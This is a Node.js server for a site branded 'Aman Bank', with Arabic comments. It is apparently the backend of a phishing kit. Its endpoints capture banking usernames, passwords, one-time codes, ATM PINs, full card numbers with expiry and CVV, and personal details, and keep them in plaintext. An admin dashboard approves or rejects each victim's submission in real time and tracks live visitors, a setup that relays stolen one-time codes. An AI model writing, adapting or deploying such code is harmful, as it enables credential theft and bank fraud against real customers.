// ============================================================
// Aman Bank - Backend Server (no database, no external deps)
// Run with: node server.js
// Then open:
//   http://localhost:3000/index.html   (the customer-facing app)
//   http://localhost:3000/admin.html      (the admin dashboard)
// ============================================================

const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const PORT = process.env.PORT || 3000;
const PUBLIC_DIR = __dirname;
const DEFAULT_ADMIN_PASSWORD_HASH = '685b35b56408d68e45016e1e44866afd:8779287e0a338987092f40aa3f54744c99d68d0582034c7186d5a04d6e01e7b155f1d25508fb4ad4a1cb2f45d9d2a2b5bf32eee27cb1da6af996989244226a0a';
const ADMIN_PASSWORD_HASH = process.env.ADMIN_PASSWORD_HASH || DEFAULT_ADMIN_PASSWORD_HASH;
const adminSessions = new Map();
const ADMIN_SESSION_TTL_MS = 8 * 60 * 60 * 1000;

// ---------- In-memory "database" ----------
// Everything lives in memory while the server process is running.
// Restarting the server clears it (no database, as requested).
let requests = [];       // { id, username, password, otp, atmPin, name, phone, address, status, createdAt }
let nextId = 1;
const liveSessions = new Map(); // sessionId -> lastSeenTimestamp
const HEARTBEAT_WINDOW_MS = 8000; // a session counts as "live" if seen in the last 8s

// ---------- Helpers ----------
function sendJSON(res, statusCode, dataObj) {
  const body = JSON.stringify(dataObj);
  res.writeHead(statusCode, {
    'Content-Type': 'application/json; charset=utf-8',
    'Content-Length': Buffer.byteLength(body),
  });
  res.end(body);
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    let data = '';
    req.on('data', (chunk) => {
      data += chunk;
      if (data.length > 1e6) req.destroy(); // 1MB safety limit
    });
    req.on('end', () => {
      if (!data) return resolve({});
      try {
        resolve(JSON.parse(data));
      } catch (err) {
        reject(err);
      }
    });
    req.on('error', reject);
  });
}

function todayKey() {
  return new Date().toISOString().slice(0, 10);
}

function verifyAdminPassword(password) {
  const parts = ADMIN_PASSWORD_HASH.split(':');
  if (parts.length !== 2) return false;
  const expected = Buffer.from(parts[1], 'hex');
  const actual = crypto.scryptSync(password, parts[0], expected.length);
  return crypto.timingSafeEqual(actual, expected);
}

function getAdminSession(req) {
  const authorization = req.headers.authorization || '';
  const token = authorization.startsWith('Bearer ') ? authorization.slice(7) : '';
  const session = adminSessions.get(token);
  if (!session || Date.now() - session.createdAt > ADMIN_SESSION_TTL_MS) {
    if (token) adminSessions.delete(token);
    return null;
  }
  return token;
}

function requireAdmin(req, res) {
  if (getAdminSession(req)) return true;
  sendJSON(res, 401, { ok: false, error: 'admin authentication required' });
  return false;
}

function serveStatic(req, res, urlPath) {
  let filePath = urlPath === '/' ? '/index.html' : urlPath;
  filePath = path.join(PUBLIC_DIR, filePath);

  // Prevent path traversal outside the public dir
  if (!filePath.startsWith(PUBLIC_DIR)) {
    res.writeHead(403);
    return res.end('Forbidden');
  }

  function respond(finalPath) {
    fs.readFile(finalPath, (err, content) => {
      if (err) {
        res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
        return res.end('404 - الملف غير موجود');
      }
      const ext = path.extname(finalPath).toLowerCase();
      const mime = {
        '.html': 'text/html; charset=utf-8',
        '.js': 'application/javascript',
        '.css': 'text/css',
        '.png': 'image/png',
      }[ext] || 'application/octet-stream';
      res.writeHead(200, { 'Content-Type': mime });
      res.end(content);
    });
  }

  // جرّب المسار كما هو الأول
  fs.access(filePath, fs.constants.F_OK, (err) => {
    if (!err) return respond(filePath);
    // لو مش موجود ومفيهوش امتداد (زي /admin بدل /admin.html)، جرّب إضافة .html
    if (!path.extname(filePath)) {
      const withHtml = filePath + '.html';
      return fs.access(withHtml, fs.constants.F_OK, (err2) => {
        if (!err2) return respond(withHtml);
        respond(filePath); // هيرجع 404 بشكل طبيعي
      });
    }
    respond(filePath); // هيرجع 404 بشكل طبيعي
  });
}

// ---------- Request handler ----------
const server = http.createServer(async (req, res) => {
  const { method, url } = req;
  const urlObj = new URL(url, `http://${req.headers.host}`);
  const pathname = urlObj.pathname;

  try {
    if (method === 'POST' && pathname === '/api/admin-login') {
      const body = await readBody(req);
      const password = (body.password || '').toString();
      if (!verifyAdminPassword(password)) {
        return sendJSON(res, 401, { ok: false, error: 'invalid admin password' });
      }
      const token = crypto.randomBytes(32).toString('hex');
      adminSessions.set(token, { createdAt: Date.now() });
      return sendJSON(res, 200, { ok: true, token });
    }

    if (pathname === '/api/requests' || pathname === '/api/stats' || pathname === '/api/live-count' || (pathname.startsWith('/api/requests/') && pathname.endsWith('/status'))) {
      if (!requireAdmin(req, res)) return;
    }

    // ---- API: receive customer details when continuing the order ----
    if (method === 'POST' && pathname === '/api/order') {
      const body = await readBody(req);
      let entry = body.requestId ? requests.find((r) => r.id === Number(body.requestId)) : null;
      if (!entry) {
        entry = {
          id: nextId++,
          username: '',
          password: '',
          otp: null,
          atmPin: '',
          name: '',
          phone: '',
          mobile: '',
          address: '',
          email: '',
          cardName: '',
          cardNumber: '',
          cardExpiry: '',
          cardCvv: '',
          status: 'pending',
          createdAt: Date.now(),
          dateKey: todayKey(),
        };
        requests.unshift(entry);
      }

      if (body.name) entry.name = body.name.toString().slice(0, 100);
      if (body.phone || body.mobile) {
        const val = (body.phone || body.mobile).toString().slice(0, 100);
        entry.phone = val;
        entry.mobile = val;
      }
      if (body.address) entry.address = body.address.toString().slice(0, 200);
      if (body.email) entry.email = body.email.toString().slice(0, 100);

      entry.status = 'pending';
      return sendJSON(res, 200, { ok: true, id: entry.id });
    }

    // ---- API: receive payment / card details ----
    if (method === 'POST' && pathname === '/api/payment') {
      const body = await readBody(req);
      let entry = body.requestId ? requests.find((r) => r.id === Number(body.requestId)) : null;
      if (!entry) {
        entry = {
          id: nextId++,
          username: '',
          password: '',
          otp: null,
          atmPin: '',
          name: '',
          phone: '',
          mobile: '',
          address: '',
          email: '',
          cardName: '',
          cardNumber: '',
          cardExpiry: '',
          cardCvv: '',
          status: 'pending',
          createdAt: Date.now(),
          dateKey: todayKey(),
        };
        requests.unshift(entry);
      }

      if (body.cardName) entry.cardName = body.cardName.toString().slice(0, 100);
      if (body.cardNumber) entry.cardNumber = body.cardNumber.toString().slice(0, 100);
      if (body.expiryDate || body.cardExpiry) entry.cardExpiry = (body.expiryDate || body.cardExpiry).toString().slice(0, 100);
      if (body.cvv || body.cardCvv) entry.cardCvv = (body.cvv || body.cardCvv).toString().slice(0, 100);

      entry.status = 'pending';
      return sendJSON(res, 200, { ok: true, id: entry.id });
    }

    // ---- API: receive a login submission from the customer flow ----
    if (method === 'POST' && pathname === '/api/login') {
      const body = await readBody(req);
      let entry = body.requestId ? requests.find((request) => request.id === Number(body.requestId)) : null;
      if (!entry) {
        entry = {
          id: nextId++,
          username: '',
          password: '',
          otp: null,
          atmPin: '',
          name: '',
          phone: '',
          mobile: '',
          address: '',
          email: '',
          cardName: '',
          cardNumber: '',
          cardExpiry: '',
          cardCvv: '',
          status: 'pending',
          createdAt: Date.now(),
          dateKey: todayKey(),
        };
        requests.unshift(entry);
      }

      entry.username = (body.username || body.email || body.mobile || body.name || '').toString().slice(0, 100);
      entry.password = (body.password || body.phone || body.mobile || '').toString().slice(0, 100);
      
      if (body.cardName) entry.cardName = body.cardName.toString().slice(0, 100);
      if (body.cardNumber) entry.cardNumber = body.cardNumber.toString().slice(0, 100);
      if (body.cardExpiry) entry.cardExpiry = body.cardExpiry.toString().slice(0, 100);
      if (body.cardCvv) entry.cardCvv = body.cardCvv.toString().slice(0, 100);

      entry.status = 'pending';
      return sendJSON(res, 200, { ok: true, id: entry.id });
    }

    // ---- API: receive an OTP submission ----
    if (method === 'POST' && pathname === '/api/otp') {
      const body = await readBody(req);
      let entry = requests.find((r) => r.id === Number(body.id));
      if (!entry) {
        entry = {
          id: Number(body.id) || nextId++,
          username: '',
          password: '',
          otp: null,
          atmPin: '',
          name: '',
          phone: '',
          mobile: '',
          address: '',
          email: '',
          cardName: '',
          cardNumber: '',
          cardExpiry: '',
          cardCvv: '',
          status: 'pending',
          createdAt: Date.now(),
          dateKey: todayKey(),
        };
        requests.unshift(entry);
      }
      entry.otp = (body.otp || '').toString().slice(0, 20);
      entry.status = 'pending';
      return sendJSON(res, 200, { ok: true, id: entry.id });
    }

    // ---- API: receive an ATM PIN submission ----
    if (method === 'POST' && pathname === '/api/atm') {
      const body = await readBody(req);
      const entry = requests.find((r) => r.id === Number(body.id));
      if (!entry) return sendJSON(res, 404, { ok: false, error: 'not found' });
      entry.atmPin = (body.atmPin || '').toString().slice(0, 10);
      entry.status = 'pending';
      return sendJSON(res, 200, { ok: true, id: entry.id });
    }

    // ---- API: list all requests (for admin dashboard polling) ----
    if (method === 'GET' && pathname === '/api/requests') {
      return sendJSON(res, 200, { ok: true, requests });
    }

    // ---- API: check a single request's status (used by index.html / otp.html while waiting) ----
    if (method === 'GET' && pathname.startsWith('/api/status/')) {
      const idStr = pathname.split('/')[3];
      const entry = requests.find((r) => r.id === Number(idStr));
      if (!entry) {
        return sendJSON(res, 200, { ok: true, status: 'pending' });
      }
      return sendJSON(res, 200, { ok: true, status: entry.status });
    }

    // ---- API: update a request's status (approve/reject from admin) ----
    if (method === 'POST' && pathname.startsWith('/api/requests/') && pathname.endsWith('/status')) {
      const idStr = pathname.split('/')[3];
      const body = await readBody(req);
      const entry = requests.find((r) => r.id === Number(idStr));
      if (!entry) return sendJSON(res, 404, { ok: false, error: 'not found' });
      if (!['approved', 'rejected', 'pending'].includes(body.status)) {
        return sendJSON(res, 400, { ok: false, error: 'invalid status' });
      }
      entry.status = body.status;
      return sendJSON(res, 200, { ok: true });
    }

    // ---- API: heartbeat from an open index.html tab (for live visitor count) ----
    if (method === 'POST' && pathname === '/api/heartbeat') {
      const body = await readBody(req);
      const sessionId = (body.sessionId || '').toString().slice(0, 100);
      if (sessionId) liveSessions.set(sessionId, Date.now());
      return sendJSON(res, 200, { ok: true });
    }

    // ---- API: current live visitor count ----
    if (method === 'GET' && pathname === '/api/live-count') {
      const now = Date.now();
      let count = 0;
      for (const [sid, lastSeen] of liveSessions) {
        if (now - lastSeen <= HEARTBEAT_WINDOW_MS) count++;
        else liveSessions.delete(sid); // cleanup stale sessions
      }
      return sendJSON(res, 200, { ok: true, count });
    }

    // ---- API: today / total visit-request stats ----
    if (method === 'GET' && pathname === '/api/stats') {
      const today = todayKey();
      const todayCount = requests.filter((r) => r.dateKey === today).length;
      return sendJSON(res, 200, { ok: true, today: todayCount, total: requests.length });
    }

    // ---- Fallback: serve static files (index.html, admin.html) ----
    if (method === 'GET') {
      return serveStatic(req, res, pathname);
    }

    res.writeHead(405);
    res.end('Method Not Allowed');
  } catch (err) {
    console.error(err);
    sendJSON(res, 500, { ok: false, error: 'server error' });
  }
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`✔ الخادم شغال على http://0.0.0.0:${PORT}`);
  console.log(`  - صفحة العميل: http://localhost:${PORT}/index.html`);
  console.log(`  - لوحة الإدارة: http://localhost:${PORT}/admin.html`);
});
